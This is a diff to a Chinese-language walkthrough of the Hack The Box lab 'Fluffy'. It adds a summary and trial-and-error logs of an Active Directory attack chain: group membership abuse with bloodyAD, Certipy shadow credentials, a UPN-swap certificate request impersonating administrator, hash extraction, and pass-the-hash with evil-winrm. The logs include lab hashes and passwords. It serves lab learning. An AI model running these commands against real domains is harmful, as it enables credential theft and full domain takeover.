@@ -243,11 +243,6 @@ Winrm_SVC和ldap_SVC
 ```
 #### 注： 从bloodyAD的下载开始要进入root执行命令
 ```
-sudo apt install pipx -y
-pipx ensurepath
-pipx uninstall bloodyAD
-pipx install bloodyAD
-
 [★]$ sudo su
 # pipx install --force bloodyAD
 Installing to existing venv 'bloodyad'
@@ -338,6 +333,37 @@ ADCS        10.129.232.88   389    DC01             [*] Starting LDAP search wit
 ADCS        10.129.232.88   389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
 ADCS        10.129.232.88   389    DC01             Found CN: fluffy-DC01-CA
 ```
+### 总结
+#### [1]要在sudo su的环境下使用bloodyAD和certipy获得ca_svc、winrm_svc的hashes
+```
+[★]$ sudo su
+# pipx install --force bloodyAD
+# bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.56.0 add groupMember 'service accounts' p.agila
+
+#sudo ntpdate 10.129.56.220
+#certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+#certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
+```
+#### [2]winrm_svc用户获得user.txt,并且使用'winrm_svc'用户得到 Found CN: fluffy-DC01-CA
+```
+#evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
+[★]$ crackmapexec ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
+```
+#### [3]winrm_svc 对 ca_svc 有 GenericWrite
+```
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+
+[★]$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.63.70  -ca 'fluffy-DC01-CA' -template User -upn administrator@fluffy.htb
+
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+
+[★]$ certipy auth -dc-ip 10.129.63.70 -pfx administrator.pfx -u administrator -domain fluffy.htb
+[★]$ evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+```
+---------------------------------------------------------------------------------------------------
+### 以下是8天的试错排错体验 
 #### '(objectClass=pKIEnrollmentService)'这是一个 LDAP 搜索条件,在整个 AD 里，找所有 证书颁发机构（CA）对象
 #### 只要能在 LDAP 里搜到这个 objectClass，就说明
 | 能说明什么           | 是否成立 |
@@ -497,23 +523,171 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 #### 最后，让我们使用管理员。获取Administrator用户的RC4哈希值。
 #### 使用这个RC4哈希，我们可以通过WinRM作为Administrator用户访问目标。
 
-$ nxc smb dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
+```
+-dc-ip：强制 Kerberos / LDAP 用 IP
 
-$ rusthound-ce --domain fluffy.htb -u j.fleishman -p 'J0elTHEM4n1990!'
+-target：RPC/SMB 用 hostname（NetBIOS / DNS）
 
-$ sudo ntpdate fluffy.htb 
-$ nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt  
+强制 Certipy 使用 RPC over TCP，而不是 NetBIOS
 
-$ scp output.txt kracken:
-$ ssh kracken
-#  mv output.txt hashcat/hashes/fluffy.krb
-# cd hashcat
-# ./hashcat hashes/fluffy.krb /opt/wordlists/rockyou.txt
-# ./hashcat -m 13100 hashes/fluffy.krb /opt/wordlists/rockyou.txt
+#certipy req
+-u ca_svc \
+-hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
+-dc-ip 10.129.63.25 \
+-ca 'fluffy-DC01-CA' \
+-template User \
+-upn administrator@fluffy.htb
+
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 18
+[*] Got certificate with UPN 'ca_svc@fluffy.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'ca_svc.pfx'
+```
+________________
+#### 查看漏洞ESC16的用户 ca_svc@fluffy.htb 但结果没用
+```
+[★]$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
+[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'fluffy-DC01-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+#### winrm_svc 对 ca_svc 确实有 GenericWrite
+```
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+______________
+[★]$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.63.70 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User //不行，去掉-target dc01.fluffy.htb
+
+[★]$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.63.70  -ca fluffy-DC01-CA -template User //不行 添加-upn administrator@fluffy.htb
+
+[★]$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.63.70  -ca fluffy-DC01-CA -template User -upn administrator@fluffy.htb //不行 -ca 需要双引号
+
+[★]$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.63.70  -ca 'fluffy-DC01-CA' -template User -upn administrator@fluffy.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 18
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+ ```
+#### 根本看不出区别：因为 certipy account read 默认并不会显示 userPrincipalName 字段
+```
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
 
 
-$ cd /opt/bloodhound/server/
-$ docker compose up -d
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-浏览器 http://localhost:8080
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
 
+
+
+[★]$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+```
+#### 突破
+```
+[★]$ certipy auth -dc-ip 10.129.63.70 -pfx administrator.pfx -u administrator -domain fluffy.htb
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+```
+[★]$ evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+fluffy\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        1/15/2026   1:06 PM             34 root.txt
+```
